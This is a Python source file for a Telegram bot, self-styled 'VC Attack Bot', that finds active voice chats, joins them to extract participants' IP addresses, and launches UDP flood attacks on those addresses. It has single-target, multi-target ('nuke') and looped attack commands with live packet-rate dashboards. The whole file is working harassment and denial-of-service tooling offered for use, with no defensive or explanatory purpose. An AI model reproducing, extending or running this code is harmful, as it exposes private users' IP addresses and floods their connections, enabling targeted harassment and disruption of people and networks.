from __future__ import annotations
import asyncio, logging, time
from enum import Enum
from pyrogram import Client, filters
from pyrogram.errors import FloodWait, RPCError
from pyrogram.handlers import MessageHandler, CallbackQueryHandler
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from attack_engine import AttackEngine
from vc_detector import VCDetector, VCRecord
from utils import is_valid_port, human_bytes

LOGGER = logging.getLogger(__name__)

class State(str, Enum):
    IDLE = "IDLE"
    SCAN = "SCAN"
    SELECT = "SELECT"
    JOIN = "JOIN"
    CONFIRM = "CONFIRM"
    ATTACK = "ATTACK"
    LOOP = "LOOP"

class BotHandler:
    def __init__(
        self,
        bot: Client,
        detector: VCDetector,
        engine: AttackEngine,
        admin_id: int | None,
        max_dur: int,
        limit: int
    ):
        self.bot = bot
        self.detector = detector
        self.engine = engine
        self.admin = admin_id
        self.max_dur = max_dur
        self.limit = limit
        
        # State management
        self.state = State.IDLE
        self.records = []
        self.selected = None
        self.target_ip = None
        self.target_port = 0
        self.loop_active = False
        self.loop_count = 0
        self.loop_iter = 0
        self.progress_task = None
        self.active_attacks = {}
        
        # Register handlers
        self._register_handlers()

    def _register_handlers(self):
        """Register all command handlers"""
        self.bot.add_handler(MessageHandler(self.cmd_scan, filters.command("scan")))
        self.bot.add_handler(MessageHandler(self.cmd_attack, filters.command("attack")))
        self.bot.add_handler(MessageHandler(self.cmd_nuke, filters.command("nuke")))
        self.bot.add_handler(MessageHandler(self.cmd_loop, filters.command("loop")))
        self.bot.add_handler(MessageHandler(self.cmd_stop, filters.command("stop")))
        self.bot.add_handler(MessageHandler(self.cmd_status, filters.command("status")))
        self.bot.add_handler(MessageHandler(self.cmd_help, filters.command("help")))
        self.bot.add_handler(MessageHandler(self.cmd_start, filters.command("start")))
        self.bot.add_handler(CallbackQueryHandler(self.on_callback))

    async def cmd_start(self, client, msg):
        """Start command"""
        await msg.reply(
            "🔥 **VC Attack Bot Ready!**\n\n"
            "**Commands:**\n"
            "/scan - Find active voice chats\n"
            "/attack <ip> <port> [duration] - Attack target\n"
            "/nuke <ip:port> [ip:port ...] <duration> - Multi-target\n"
            "/loop <ip> <port> <duration> <iterations> - Loop attack\n"
            "/stop - Stop everything\n"
            "/status - Check status\n"
            "/help - Show this message\n\n"
            "💡 Start with /scan to find VCs!"
        )

    async def cmd_help(self, client, msg):
        """Help command"""
        await self.cmd_start(client, msg)

    async def cmd_scan(self, client, msg):
        """Scan for voice chats"""
        if self.state not in (State.IDLE, State.SCAN):
            await msg.reply(f"⚠️ Busy: {self.state}. Use /stop first")
            return
            
        if self.admin and msg.from_user.id != self.admin:
            await msg.reply("❌ Admin only")
            return
            
        self.state = State.SCAN
        status_msg = await msg.reply("🔎 **Scanning for voice chats...**")
        
        try:
            self.records = await self.detector.scan(limit=self.limit)
        except Exception as e:
            await status_msg.edit(f"❌ Scan error: {e}")
            self.state = State.IDLE
            return
            
        if not self.records:
            await status_msg.edit("❌ No active voice chats found. Start a VC first!")
            self.state = State.IDLE
            return
            
        # Create selection buttons
        buttons = []
        for i, record in enumerate(self.records[:20]):  # Limit display
            title = record.title[:30] if record.title else f"Chat {record.chat_id}"
            buttons.append([
                InlineKeyboardButton(
                    f"{i+1}. {title}",
                    callback_data=f"sel:{i}"
                )
            ])
            
        if len(self.records) > 20:
            buttons.append([
                InlineKeyboardButton(
                    f"➕ Show all ({len(self.records)} total)",
                    callback_data="show_all"
                )
            ])
            
        await status_msg.edit(
            f"✅ **Found {len(self.records)} active VCs**\n"
            f"Select one to extract IPs:",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        self.state = State.SELECT

    async def cmd_attack(self, client, msg):
        """Single target attack"""
        if self.admin and msg.from_user.id != self.admin:
            await msg.reply("❌ Admin only")
            return
            
        parts = msg.text.split()
        if len(parts) < 3:
            await msg.reply(
                "**Usage:** `/attack <ip> <port> [duration]`\n"
                "Example: `/attack 1.1.1.1 10001 60`"
            )
            return
            
        ip = parts[1]
        try:
            port = int(parts[2])
        except ValueError:
            await msg.reply("❌ Invalid port")
            return
            
        dur = int(parts[3]) if len(parts) > 3 else 30
        dur = min(dur, self.max_dur)
        
        if not is_valid_port(port):
            await msg.reply("❌ Port must be 1-65535")
            return
            
        await self._start_attack(msg.chat.id, ip, port, dur)

    async def cmd_nuke(self, client, msg):
        """Parallel multi-target attack"""
        if self.admin and msg.from_user.id != self.admin:
            await msg.reply("❌ Admin only")
            return
            
        parts = msg.text.split()
        if len(parts) < 3:
            await msg.reply(
                "**Usage:** `/nuke <ip:port> [ip:port ...] <duration>`\n"
                "Example: `/nuke 1.1.1.1:80 2.2.2.2:443 30`"
            )
            return
            
        targets = []
        dur = 30
        
        for p in parts[1:]:
            if ":" in p:
                try:
                    ip, port_str = p.rsplit(":", 1)
                    port = int(port_str)
                    if is_valid_port(port):
                        targets.append((ip, port))
                except ValueError:
                    continue
            else:
                try:
                    dur = int(p)
                except ValueError:
                    continue
                    
        if not targets:
            await msg.reply("❌ No valid targets found")
            return
            
        dur = min(dur, self.max_dur)
        await msg.reply(
            f"💥 **NUKING {len(targets)} targets**\n"
            f"Duration: {dur}s\n"
            f"Targets: {', '.join([f'{ip}:{port}' for ip, port in targets[:5]])}"
            + (f" and {len(targets)-5} more" if len(targets) > 5 else "")
        )
        
        # Launch all attacks
        tasks = []
        for ip, port in targets:
            tasks.append(
                self._start_attack(
                    msg.chat.id,
                    ip,
                    port,
                    dur,
                    silent=True
                )
            )
            
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Report results
        success = sum(1 for r in results if not isinstance(r, Exception))
        failed = len(results) - success
        
        await msg.reply(
            f"✅ **Nuke completed!**\n"
            f"Success: {success}/{len(targets)}\n"
            f"Failed: {failed}"
        )

    async def cmd_loop(self, client, msg):
        """Loop attack command"""
        if self.admin and msg.from_user.id != self.admin:
            await msg.reply("❌ Admin only")
            return
            
        parts = msg.text.split()
        if len(parts) < 5:
            await msg.reply(
                "**Usage:** `/loop <ip> <port> <duration> <iterations>`\n"
                "Example: `/loop 1.1.1.1 10001 30 5`"
            )
            return
            
        ip = parts[1]
        try:
            port = int(parts[2])
            dur = int(parts[3])
            iters = int(parts[4])
        except ValueError:
            await msg.reply("❌ Invalid numbers")
            return
            
        if not is_valid_port(port) or dur <= 0 or iters <= 0:
            await msg.reply("❌ Invalid parameters")
            return
            
        dur = min(dur, self.max_dur)
        iters = min(iters, 50)
        
        self.loop_active = True
        self.loop_iter = iters
        self.loop_count = 0
        
        status_msg = await msg.reply(
            f"🔄 **Loop started**\n"
            f"Target: {ip}:{port}\n"
            f"Duration: {dur}s\n"
            f"Iterations: {iters}"
        )
        
        try:
            for i in range(iters):
                if not self.loop_active:
                    break
                    
                self.loop_count = i + 1
                await status_msg.edit(
                    f"🔄 **Round {i+1}/{iters}**\n"
                    f"Target: {ip}:{port}\n"
                    f"⏳ Attacking..."
                )
                
                await self._start_attack(
                    msg.chat.id,
                    ip,
                    port,
                    dur,
                    silent=True
                )
                
                if i < iters - 1 and self.loop_active:
                    await status_msg.edit(
                        f"⏳ **Cooldown...**\n"
                        f"Round {i+1}/{iters} complete\n"
                        f"Next in 2s"
                    )
                    await asyncio.sleep(2)
                    
        except Exception as e:
            await msg.reply(f"❌ Loop error: {e}")
            
        finally:
            self.loop_active = False
            self.state = State.IDLE
            await status_msg.edit(f"✅ **Loop finished** - {self.loop_count}/{iters} rounds")

    async def cmd_stop(self, client, msg):
        """Stop everything"""
        if self.admin and msg.from_user.id != self.admin:
            await msg.reply("❌ Admin only")
            return
            
        # Stop engine
        self.engine.stop()
        
        # Stop loop
        self.loop_active = False
        
        # Cancel progress
        if self.progress_task:
            self.progress_task.cancel()
            self.progress_task = None
            
        # Leave VC
        if self.selected:
            await self.detector.leave(self.selected)
            self.selected = None
            
        # Cleanup
        self.state = State.IDLE
        self.target_ip = None
        self.target_port = 0
        
        await msg.reply("🛑 **All attacks stopped!**")

    async def cmd_status(self, client, msg):
        """Show current status"""
        stats = self.engine.stats
        
        status_text = (
            f"📊 **Bot Status**\n\n"
            f"State: `{self.state}`\n"
            f"Target: {self.target_ip}:{self.target_port}\n"
            f"Loop: {self.loop_count}/{self.loop_iter}\n"
            f"Active: {stats.running}\n\n"
            f"📈 **Attack Stats**\n"
            f"Sent: `{stats.sent:,}` packets\n"
            f"Failed: `{stats.failed:,}`\n"
            f"Data: `{human_bytes(stats.bytes)}`\n"
            f"RPS: `{stats.rps:.1f}`\n"
            f"Duration: `{stats.elapsed:.1f}s`"
        )
        
        await msg.reply(status_text)

    async def on_callback(self, client, cb):
        """Handle callback queries"""
        data = cb.data
        
        if data.startswith("sel:"):
            try:
                idx = int(data.split(":")[1])
                if idx >= len(self.records):
                    await cb.answer("Invalid selection")
                    return
                    
                self.selected = self.records[idx]
                await cb.message.edit_text(
                    f"✅ **Selected:** {self.selected.title}\n\n"
                    f"Click JOIN to extract IPs:",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔗 JOIN & EXTRACT", callback_data="join")],
                        [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
                    ])
                )
                await cb.answer()
            except Exception as e:
                await cb.answer(f"Error: {e}")

        elif data == "join":
            if not self.selected:
                await cb.answer("No VC selected")
                return
                
            await cb.message.edit_text("⏳ **Joining and extracting IPs...**")
            await cb.answer()
            
            try:
                meta = await self.detector.extract(self.selected)
                ips = meta.get("extracted_ips", [])
                
                if not ips:
                    await cb.message.edit_text(
                        "❌ **No IPs found!**\n\n"
                        "Try:\n"
                        "1. Make sure VC is active\n"
                        "2. Use /attack manually\n"
                        "3. Check if chat has participants"
                    )
                    self.state = State.IDLE
                    return
                    
                # Store first IP
                self.target_ip = ips[0]["ip"]
                self.target_port = ips[0]["port"] or 10001
                
                # Show IPs
                ip_lines = []
                for i, ip_info in enumerate(ips[:10]):
                    ip_lines.append(f"{i+1}. `{ip_info['ip']}:{ip_info['port']}`")
                    
                if len(ips) > 10:
                    ip_lines.append(f"... and {len(ips)-10} more")
                    
                await cb.message.edit_text(
                    f"✅ **Extracted {len(ips)} IPs**\n\n"
                    f"📡 **From:** {meta['title']}\n"
                    f"👥 Participants: {meta['participants']}\n"
                    f"🔗 Joined: {'✅' if meta['joined'] else '❌'}\n\n"
                    f"**IPs:**\n" + "\n".join(ip_lines) + "\n\n"
                    f"Attack now?",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🚀 ATTACK", callback_data="attack")],
                        [InlineKeyboardButton("🚪 LEAVE", callback_data="leave")]
                    ])
                )
                self.state = State.CONFIRM
                
            except Exception as e:
                await cb.message.edit_text(f"❌ Extraction error: {e}")
                self.state = State.IDLE

        elif data == "attack":
            if not self.target_ip or not self.target_port:
                await cb.answer("No target set")
                return
                
            await cb.answer("🚀 Launching attack!")
            await self._start_attack(
                cb.message.chat.id,
                self.target_ip,
                self.target_port,
                self.max_dur // 2
            )

        elif data == "leave":
            if self.selected:
                await self.detector.leave(self.selected)
                self.selected = None
            await cb.message.edit_text("🚪 **Left voice chat**")
            self.state = State.IDLE
            await cb.answer()

        elif data == "cancel":
            self.state = State.IDLE
            await cb.message.edit_text("❌ **Cancelled**")
            await cb.answer()

        elif data == "global_stop":
            self.engine.stop()
            self.loop_active = False
            await cb.answer("🛑 Stopped all attacks!")

        elif data == "show_all":
            # Show all VCs in chunks
            await cb.answer("Loading all...")
            # Implementation for showing all VCs

    async def _start_attack(self, chat_id, ip, port, duration, silent=False):
        """Internal attack starter"""
        self.state = State.ATTACK
        
        if not silent:
            dash = await self.bot.send_message(
                chat_id,
                f"⚡ **Attacking** {ip}:{port}\n"
                f"⏱️ Duration: {duration}s"
            )
            self.progress_task = asyncio.create_task(
                self._progress_updater(dash.chat.id, dash.id, ip, port)
            )
            
        try:
            stats = await self.engine.run_udp(ip, port, duration)
            
            result = (
                f"✅ **Attack complete**\n"
                f"Target: {ip}:{port}\n"
                f"Sent: `{stats.sent:,}` packets\n"
                f"Failed: `{stats.failed:,}`\n"
                f"Data: `{human_bytes(stats.bytes)}`\n"
                f"RPS: `{stats.rps:.1f}`"
            )
            
            if not silent:
                await dash.edit_text(result)
            else:
                await self.bot.send_message(chat_id, result)
                
        except Exception as e:
            error_msg = f"❌ Attack error: {e}"
            if not silent:
                await dash.edit_text(error_msg)
            else:
                await self.bot.send_message(chat_id, error_msg)
                
        finally:
            if self.progress_task and not silent:
                self.progress_task.cancel()
                self.progress_task = None
                
            self.state = State.IDLE if not self.loop_active else State.LOOP

    async def _progress_updater(self, chat_id, msg_id, ip, port):
        """Update attack progress"""
        while True:
            try:
                await asyncio.sleep(3)
                stats = self.engine.stats
                
                if not stats.running:
                    break
                    
                await self.bot.edit_message_text(
                    chat_id,
                    msg_id,
                    f"⚡ **Attacking** {ip}:{port}\n\n"
                    f"📦 Sent: `{stats.sent:,}`\n"
                    f"❌ Failed: `{stats.failed:,}`\n"
                    f"💾 Data: `{human_bytes(stats.bytes)}`\n"
                    f"⚡ RPS: `{stats.rps:.1f}`\n"
                    f"⏱️ Elapsed: `{stats.elapsed:.1f}s`",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🛑 STOP", callback_data="global_stop")]
                    ])
                )
            except asyncio.CancelledError:
                break
            except Exception as e:
                LOGGER.debug(f"Progress update error: {e}")
                break
